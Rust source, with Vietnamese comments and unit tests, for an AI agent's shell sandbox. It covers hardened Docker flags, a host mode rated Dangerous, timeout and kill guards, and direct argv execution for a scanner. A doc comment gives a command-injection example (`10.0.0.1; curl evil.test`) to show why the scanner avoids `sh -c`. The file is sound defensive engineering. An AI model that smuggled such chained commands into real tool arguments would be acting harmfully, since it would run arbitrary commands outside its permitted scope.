//! Sandbox shell (agents.md mục 15.2).
//!
//! Hai chế độ, bật tường minh qua `[security.sandbox] mode`:
//!
//! * **`docker` (mặc định)** — `docker run --rm` với: chỉ mount workspace vào
//!   `/workspace`, `--user` non-root, `--network none` khi `network = false` (mặc định),
//!   `--memory`, `--cpus`, `--pids-limit`, `--cap-drop ALL`,
//!   `--security-opt no-new-privileges`, container **có tên** (để `docker kill` khi
//!   timeout), KHÔNG truyền biến môi trường của host (không `-e`, không env-file).
//! * **`host`** — chạy `sh -c` trực tiếp trên host với cwd = workspace; **mọi lệnh là
//!   `Dangerous`** (xem [`Sandbox::base_risk`]) và phải bật tường minh trong cấu hình.
//!
//! Timeout: đua với `tokio::time::timeout`; docker mode gọi `docker kill <tên>`
//! (host mode kill tiến trình con) rồi trả [`SandboxError::Timeout`]. Output cắt ở
//! ranh giới UTF-8. I/O chặn → caller bọc `spawn_blocking` (mục 22.8).

use std::path::PathBuf;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::Duration;

use beanagent_types::Risk;
use beanagent_types::config::{SandboxConfig, SandboxMode};
use tokio_util::sync::CancellationToken;

/// Trần ký tự mỗi stream (stdout/stderr) trước khi ghép thành output tool.
const MAX_STREAM_CHARS: usize = 10_000;

/// Kết quả một lệnh shell.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShellOutcome {
    /// Exit code (`None` = tiến trình bị kill, không có code — ví dụ timeout).
    pub exit_code: Option<i32>,
    /// stdout (đã cắt ở ranh giới UTF-8).
    pub stdout: String,
    /// stderr (đã cắt ở ranh giới UTF-8).
    pub stderr: String,
}

/// Lỗi sandbox.
#[derive(Debug, thiserror::Error)]
pub enum SandboxError {
    /// Vượt quá thời gian cho phép — container/tiến trình đã bị kill.
    #[error("lệnh vượt quá {0}s — đã bị kill")]
    Timeout(u64),
    /// Người dùng huỷ run khi lệnh đang chạy.
    #[error("lệnh bị huỷ bởi người dùng")]
    Cancelled,
    /// Không khởi động được lệnh (thiếu docker, sai image, I/O...).
    #[error("không chạy được lệnh: {0}")]
    Launch(String),
}

/// Bộ đếm tên container toàn **tiến trình** — nhiều `Sandbox` chạy song song trong
/// cùng process (test chạy song song) vẫn không trùng tên.
static CONTAINER_SEQ: AtomicU64 = AtomicU64::new(0);

/// Cấu hình sandbox + workspace.
#[derive(Debug)]
pub struct Sandbox {
    cfg: SandboxConfig,
    workspace: PathBuf,
}

impl Sandbox {
    /// Dựng sandbox cho `workspace` với cấu hình `[security.sandbox]`.
    #[must_use]
    pub fn new(cfg: SandboxConfig, workspace: PathBuf) -> Self {
        if cfg.mode == SandboxMode::Host {
            tracing::warn!(
                "sandbox mode = HOST: mọi lệnh run_shell là Dangerous và chạy trực tiếp trên máy host"
            );
        }
        Self { cfg, workspace }
    }

    /// Mức rủi ro **cơ bản** của `run_shell` theo chế độ (mục 15.2): docker ⇒ `Confirm`,
    /// host ⇒ `Dangerous` (luôn hỏi, không có "cho phép trong phiên" — mục 7.2).
    #[must_use]
    pub const fn base_risk(&self) -> Risk {
        match self.cfg.mode {
            SandboxMode::Docker => Risk::Confirm,
            SandboxMode::Host => Risk::Dangerous,
        }
    }

    /// Timeout (giây) cho một lệnh shell theo cấu hình `[security.sandbox]`.
    #[must_use]
    pub const fn timeout_seconds(&self) -> u64 {
        self.cfg.timeout_seconds
    }

    /// Tên container kế tiếp (dùng cho kill khi timeout/huỷ) — duy nhất trong tiến trình.
    fn next_container_name() -> String {
        let n = CONTAINER_SEQ.fetch_add(1, Ordering::Relaxed);
        format!("beanagent-sbx-{}-{n}", std::process::id())
    }

    /// Dựng argv `docker run` cho một lệnh — tách riêng để **unit-test** được mà không
    /// cần docker daemon (kiểm tra đủ cờ bảo mật, không lọt env host).
    /// Các cờ `docker run` **chung** cho mọi lệnh: cô lập, non-root, giới hạn tài nguyên.
    ///
    /// Tách khỏi [`Self::docker_run_args`] để [`Self::run_argv`] dùng lại đúng bộ cờ này mà
    /// không phải sao chép (tránh tình trạng `run_shell` có cờ an toàn mà scanner thì không).
    fn docker_run_prefix(&self, container_name: &str) -> Vec<String> {
        let cfg = &self.cfg;
        let mut args: Vec<String> = vec![
            "run".into(),
            "--rm".into(),
            "--name".into(),
            container_name.into(),
            // Chỉ mount workspace — file ngoài workspace không nhìn thấy từ container.
            "--volume".into(),
            format!("{}:/workspace", self.workspace.display()),
            "--workdir".into(),
            "/workspace".into(),
            // non-root: uid/gid của người chạy BeanAgent (volume ghi được, không root).
            "--user".into(),
            current_uid_gid(),
            "--memory".into(),
            cfg.memory.clone(),
            "--cpus".into(),
            format!("{}", cfg.cpus),
            "--pids-limit".into(),
            cfg.pids_limit.to_string(),
            "--cap-drop".into(),
            "ALL".into(),
            "--security-opt".into(),
            "no-new-privileges".into(),
        ];
        if !cfg.network {
            args.push("--network".into());
            args.push("none".into());
        }
        // KHÔNG có `-e`/`--env-file`: container không nhận biến môi trường của host.
        args
    }

    fn docker_run_args(&self, container_name: &str, command: &str) -> Vec<String> {
        let mut args = self.docker_run_prefix(container_name);
        args.push(self.cfg.image.clone());
        // sh -c để thực thi chuỗi lệnh (image chuẩn có /bin/sh — Debian slim, không Node).
        args.push("sh".into());
        args.push("-c".into());
        args.push(command.to_string());
        args
    }

    /// Chạy một lệnh trong sandbox, đua với `timeout` và `cancel`.
    ///
    /// # Errors
    /// [`SandboxError`] — timeout (đã kill), huỷ, hoặc không khởi động được.
    pub async fn run(
        &self,
        command: &str,
        timeout: Duration,
        cancel: &CancellationToken,
    ) -> Result<ShellOutcome, SandboxError> {
        match self.cfg.mode {
            SandboxMode::Docker => {
                let name = Self::next_container_name();
                let args = self.docker_run_args(&name, command);
                let timeout_secs = self.cfg.timeout_seconds;
                run_docker(args, name, timeout_secs, timeout, cancel).await
            }
            SandboxMode::Host => run_host(command, self.workspace.clone(), timeout, cancel).await,
        }
    }

    /// Chạy **argv cố định** (không qua shell) trong sandbox (M23 — scanner).
    ///
    /// # Vì sao cần hàm này
    ///
    /// [`Self::run`] nhận chuỗi rồi chạy `sh -c`, nghĩa là mọi ký tự `; | & $()` trong
    /// tham số đều có ý nghĩa với shell. Với scanner đó là lỗ hổng: model chỉ cần truyền
    /// `target = "10.0.0.1; curl evil.test"` là chạy được lệnh tuỳ ý ngoài phạm vi.
    ///
    /// Ở đây argv được **code tự dựng** từ giá trị đã kiểm tra, và container `exec` trực tiếp
    /// không có shell nào để diễn giải ký tự. Target còn được đặt sau `--` để không bao giờ
    /// bị parser hiểu nhầm thành tuỳ chọn.
    ///
    /// # Errors
    /// Như [`Self::run`].
    pub async fn run_argv(
        &self,
        argv: &[String],
        timeout: Duration,
        cancel: &CancellationToken,
    ) -> Result<ShellOutcome, SandboxError> {
        if argv.is_empty() {
            return Err(SandboxError::Launch("argv rỗng".into()));
        }
        match self.cfg.mode {
            SandboxMode::Docker => {
                let name = Self::next_container_name();
                let mut args = self.docker_run_prefix(&name);
                args.push(self.cfg.image.clone());
                args.extend_from_slice(argv);
                let timeout_secs = self.cfg.timeout_seconds;
                run_docker(args, name, timeout_secs, timeout, cancel).await
            }
            SandboxMode::Host => {
                // Chế độ host: vẫn **exec trực tiếp**, không qua `sh -c` (D14.5).
                let program = argv[0].clone();
                let mut command = tokio::process::Command::new(&program);
                command.args(&argv[1..]);
                command.current_dir(&self.workspace);
                run_host_argv(command, timeout, cancel).await
            }
        }
    }
}

/// uid:gid dùng cho `--user` của container: lấy từ `id -u`/`id -g` (một lần duy nhất),
/// ép non-root — nếu không tra được hoặc đang là root ⇒ `65534:65534` (nobody).
fn current_uid_gid() -> String {
    static CACHE: std::sync::OnceLock<String> = std::sync::OnceLock::new();
    CACHE
        .get_or_init(|| {
            let id_of = |flag: &str| -> Option<String> {
                let out = std::process::Command::new("id").arg(flag).output().ok()?;
                if !out.status.success() {
                    return None;
                }
                let s = String::from_utf8_lossy(&out.stdout).trim().to_string();
                // Ép non-root: root không bao giờ được dùng cho container sandbox.
                if s.is_empty() || s == "0" {
                    None
                } else {
                    Some(s)
                }
            };
            match (id_of("-u"), id_of("-g")) {
                (Some(u), Some(g)) => format!("{u}:{g}"),
                _ => "65534:65534".to_string(),
            }
        })
        .clone()
}

/// Cắt một stream (stdout/stderr) ở `MAX_STREAM_CHARS` ký tự, đúng ranh giới UTF-8.
fn cap_stream(s: String) -> String {
    match beanagent_tools::truncate_chars(&s, MAX_STREAM_CHARS) {
        Some((kept, cut)) => format!("{kept}\n[đã cắt {cut} ký tự — xem thêm ở lượt sau]"),
        None => s,
    }
}

/// Kill một container theo tên — best effort (docker có thể không có daemon/container
/// đã thoát); luôn trả về để caller không treo.
async fn kill_container(name: &str) {
    let res = tokio::process::Command::new("docker")
        .arg("kill")
        .arg(name)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .kill_on_drop(true)
        .status()
        .await;
    if let Err(err) = res {
        tracing::warn!("không kill được container {name}: {err}");
    }
}

/// Guard: kill container khi bị drop mà chưa disarm — chống container mồ côi khi
/// agent loop timeout/huỷ (kill_on_drop chỉ kill được docker **client**, container
/// vẫn sống dưới daemon).
struct KillContainerGuard {
    name: String,
    armed: bool,
}

impl Drop for KillContainerGuard {
    fn drop(&mut self) {
        if !self.armed {
            return;
        }
        let name = self.name.clone();
        // Tách thread để không block runtime khi drop (docker kill ~chục ms).
        std::thread::spawn(move || {
            let _ = std::process::Command::new("docker")
                .arg("kill")
                .arg(&name)
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .status();
        });
    }
}

/// Chạy `docker run ...` (argv đầy đủ đã dựng ở [`Sandbox::docker_run_args`]),
/// đua với timeout + cancel. Timeout/cancel ⇒ `docker kill <tên>` rồi trả lỗi.
async fn run_docker(
    args: Vec<String>,
    name: String,
    timeout_secs: u64,
    timeout: Duration,
    cancel: &CancellationToken,
) -> Result<ShellOutcome, SandboxError> {
    let child = tokio::process::Command::new("docker")
        .args(&args)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        // Huỷ future (timeout/cancel) → kill luôn tiến trình docker client.
        .kill_on_drop(true)
        .spawn()
        .map_err(|e| SandboxError::Launch(format!("không khởi động được docker: {e}")))?;

    let mut guard = KillContainerGuard {
        name: name.clone(),
        armed: true,
    };

    let result = tokio::select! {
        biased;
        _ = cancel.cancelled() => Err(SandboxError::Cancelled),
        _ = tokio::time::sleep(timeout) => Err(SandboxError::Timeout(timeout_secs)),
        res = child.wait_with_output() => {
            let output =
                res.map_err(|e| SandboxError::Launch(format!("docker run lỗi: {e}")))?;
            if !output.status.success() && output.stderr.is_empty() && output.stdout.is_empty() {
                // docker không chạy được (thiếu image/daemon...) — báo rõ cho model.
                Err(SandboxError::Launch(format!(
                    "docker exit {}: không có output — kiểm tra image sandbox đã tồn tại chưa \
                     (`docker pull <image>`)",
                    output.status.code().unwrap_or(-1),
                )))
            } else {
                Ok(ShellOutcome {
                    exit_code: output.status.code(),
                    stdout: cap_stream(String::from_utf8_lossy(&output.stdout).into_owned()),
                    stderr: cap_stream(String::from_utf8_lossy(&output.stderr).into_owned()),
                })
            }
        }
    };

    match &result {
        // Lệnh đã kết thúc (kể cả lỗi launch): container đã dừng — không cần kill.
        Ok(_) | Err(SandboxError::Launch(_)) => guard.armed = false,
        // Timeout/Cancelled: kill_container đã chạy trong branch? Không — chạy đây cho
        // cả hai nhánh (bao gồm drop-khi-outer-timeout qua guard).
        Err(SandboxError::Timeout(_)) | Err(SandboxError::Cancelled) => {
            kill_container(&name).await;
            guard.armed = false; // kill_container đã lo, tránh kill lần hai ở Drop
        }
    }
    result
}

/// Chế độ host: `sh -c <command>` với cwd = workspace. Timeout/cancel ⇒ kill tiến trình.
async fn run_host(
    command: &str,
    workspace: PathBuf,
    timeout: Duration,
    cancel: &CancellationToken,
) -> Result<ShellOutcome, SandboxError> {
    let child = tokio::process::Command::new("sh")
        .arg("-c")
        .arg(command)
        .current_dir(&workspace)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .kill_on_drop(true)
        .spawn()
        .map_err(|e| SandboxError::Launch(format!("không khởi động được sh: {e}")))?;

    tokio::select! {
        biased;
        // Huỷ future (cancel/timeout) → kill_on_drop tự kill tiến trình sh.
        _ = cancel.cancelled() => Err(SandboxError::Cancelled),
        _ = tokio::time::sleep(timeout) => Err(SandboxError::Timeout(timeout.as_secs())),
        res = child.wait_with_output() => {
            let output =
                res.map_err(|e| SandboxError::Launch(format!("sh lỗi: {e}")))?;
            Ok(ShellOutcome {
                exit_code: output.status.code(),
                stdout: cap_stream(String::from_utf8_lossy(&output.stdout).into_owned()),
                stderr: cap_stream(String::from_utf8_lossy(&output.stderr).into_owned()),
            })
        }
    }
}

/// Chế độ host, **exec trực tiếp** argv (không qua `sh -c`) — dùng cho scanner (M23, D14.5).
///
/// `command` đã được dựng sẵn ở [`Sandbox::run_argv`], nên không có tầng shell nào diễn giải
/// ký tự trong tham số.
async fn run_host_argv(
    mut command: tokio::process::Command,
    timeout: Duration,
    cancel: &CancellationToken,
) -> Result<ShellOutcome, SandboxError> {
    let child = command
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .kill_on_drop(true)
        .spawn()
        .map_err(|e| SandboxError::Launch(format!("không khởi động được scanner: {e}")))?;

    tokio::select! {
        biased;
        _ = cancel.cancelled() => Err(SandboxError::Cancelled),
        _ = tokio::time::sleep(timeout) => Err(SandboxError::Timeout(timeout.as_secs())),
        res = child.wait_with_output() => {
            let output = res.map_err(|e| SandboxError::Launch(format!("scanner lỗi: {e}")))?;
            Ok(ShellOutcome {
                exit_code: output.status.code(),
                stdout: cap_stream(String::from_utf8_lossy(&output.stdout).into_owned()),
                stderr: cap_stream(String::from_utf8_lossy(&output.stderr).into_owned()),
            })
        }
    }
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used)]
    use super::*;
    use beanagent_types::config::{SandboxConfig, SandboxMode};

    fn docker_args(cmd: &str) -> Vec<String> {
        let ws = tempfile::tempdir().unwrap();
        let sandbox = Sandbox::new(
            SandboxConfig {
                mode: SandboxMode::Docker,
                network: false,
                ..SandboxConfig::default()
            },
            ws.path().to_path_buf(),
        );
        // Giữ tempdir sống qua toàn bộ hàm (workspace path chỉ cần trong lúc build args).
        let args = sandbox.docker_run_args("beanagent-sbx-test-1", cmd);
        std::mem::forget(ws);
        args
    }

    #[test]
    fn docker_args_has_all_security_flags_and_no_env() {
        let args = docker_args("ls -la");
        let joined = args.join(" ");

        // Các cờ bắt buộc (mục 15.2).
        assert!(joined.contains("--rm"));
        assert!(joined.contains("--name beanagent-sbx-test-1"));
        assert!(
            joined.contains("--network none"),
            "network=false → none: {joined}"
        );
        assert!(joined.contains("--cap-drop ALL"));
        assert!(joined.contains("no-new-privileges"));
        assert!(joined.contains("--memory "));
        assert!(joined.contains("--cpus "));
        assert!(joined.contains("--pids-limit "));
        assert!(joined.contains("--user "));
        // Không truyền env host: không có -e/--env/--env-file.
        assert!(
            !joined.contains(" -e ") && !joined.contains("--env"),
            "{joined}"
        );
        assert!(!joined.contains("--env-file"), "{joined}");
        // Chỉ mount workspace (một --volume duy nhất trỏ tới path workspace).
        assert_eq!(
            args.iter()
                .filter(|a| a == &&"--volume".to_string())
                .count(),
            1
        );
        // Image + sh -c <command> là phần cuối.
        let len = args.len();
        assert_eq!(args[len - 3], "sh");
        assert_eq!(args[len - 2], "-c");
        assert_eq!(args[len - 1], "ls -la");
        // --user non-root.
        let user = args
            .iter()
            .position(|a| a == "--user")
            .map(|i| args[i + 1].clone())
            .unwrap();
        let uid = user.split(':').next().unwrap();
        assert_ne!(uid, "0", "--user phải non-root: {user}");
    }

    #[test]
    fn docker_args_network_true_omits_network_flag() {
        let ws = tempfile::tempdir().unwrap();
        let sandbox = Sandbox::new(
            SandboxConfig {
                mode: SandboxMode::Docker,
                network: true,
                ..SandboxConfig::default()
            },
            ws.path().to_path_buf(),
        );
        let args = sandbox.docker_run_args("n1", "true");
        assert!(!args.contains(&"--network".to_string()));
    }

    #[test]
    fn base_risk_follows_mode() {
        let ws = tempfile::tempdir().unwrap();
        let docker = Sandbox::new(
            SandboxConfig {
                mode: SandboxMode::Docker,
                ..SandboxConfig::default()
            },
            ws.path().to_path_buf(),
        );
        let host = Sandbox::new(
            SandboxConfig {
                mode: SandboxMode::Host,
                ..SandboxConfig::default()
            },
            ws.path().to_path_buf(),
        );
        assert_eq!(docker.base_risk(), Risk::Confirm);
        assert_eq!(host.base_risk(), Risk::Dangerous);
    }

    #[tokio::test]
    async fn host_mode_runs_and_captures_output() {
        let ws = tempfile::tempdir().unwrap();
        std::fs::write(ws.path().join("in.txt"), "có file").unwrap();
        let sandbox = Sandbox::new(
            SandboxConfig {
                mode: SandboxMode::Host,
                ..SandboxConfig::default()
            },
            ws.path().to_path_buf(),
        );
        let cancel = CancellationToken::new();
        let out = sandbox
            .run(
                "echo xin-chào && ls in.txt",
                Duration::from_secs(5),
                &cancel,
            )
            .await
            .unwrap();
        assert_eq!(out.exit_code, Some(0));
        assert!(out.stdout.contains("xin-chào"));
        assert!(out.stdout.contains("in.txt"));
        // Exit code khác 0 được trả đúng (không phải lỗi sandbox).
        let fail = sandbox
            .run("exit 3", Duration::from_secs(5), &cancel)
            .await
            .unwrap();
        assert_eq!(fail.exit_code, Some(3));
    }

    #[tokio::test]
    async fn host_mode_timeout_kills_process() {
        let ws = tempfile::tempdir().unwrap();
        let sandbox = Sandbox::new(
            SandboxConfig {
                mode: SandboxMode::Host,
                timeout_seconds: 2,
                ..SandboxConfig::default()
            },
            ws.path().to_path_buf(),
        );
        let cancel = CancellationToken::new();
        let started = std::time::Instant::now();
        let err = sandbox
            .run("sleep 30", Duration::from_secs(1), &cancel)
            .await
            .unwrap_err();
        assert!(matches!(err, SandboxError::Timeout(_)), "{err:?}");
        // Trở về nhanh (không đợi hết 30s) — có dư địa cho kill.
        assert!(started.elapsed() < Duration::from_secs(5));
    }

    #[tokio::test]
    async fn cap_stream_cuts_on_utf8_boundary() {
        let long = "Tiếng Việt 🦀 ".repeat(5000);
        let capped = cap_stream(long.clone());
        assert!(capped.chars().count() < long.chars().count());
        assert!(capped.contains("đã cắt"));
        assert!(!capped.contains('\u{FFFD}'));
    }
}
